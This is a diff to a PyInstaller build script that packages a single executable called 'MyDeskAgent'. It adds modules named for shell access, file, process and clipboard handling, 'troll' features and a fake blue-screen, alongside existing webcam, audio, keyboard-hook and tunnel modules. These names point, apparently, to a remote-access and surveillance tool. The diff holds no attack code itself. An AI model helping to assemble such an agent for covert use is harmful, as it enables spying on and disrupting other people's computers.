@@ -54,6 +54,14 @@ python -m PyInstaller --console --onefile --noupx --name MyDeskAgent ^
     --hidden-import=target.audio ^
     --hidden-import=target.webcam ^
     --hidden-import=target.auditor ^
+    --hidden-import=target.shell_handler ^
+    --hidden-import=target.process_manager ^
+    --hidden-import=target.file_manager ^
+    --hidden-import=target.clipboard_handler ^
+    --hidden-import=target.device_settings ^
+    --hidden-import=target.troll_handler ^
+    --hidden-import=target.troll_video_player ^
+    --hidden-import=target.bsod_screen ^
     --hidden-import=pynput.keyboard._win32 ^
     --hidden-import=pynput.mouse._win32 ^
     --hidden-import=numpy ^
@@ -61,6 +69,7 @@ python -m PyInstaller --console --onefile --noupx --name MyDeskAgent ^
     --hidden-import=PIL.Image ^
     --hidden-import=cv2 ^
     --hidden-import=requests ^
+    --hidden-import=psutil ^
     --hidden-import=target.tunnel_manager ^
     --add-data "target;target" ^
     agent_loader.py
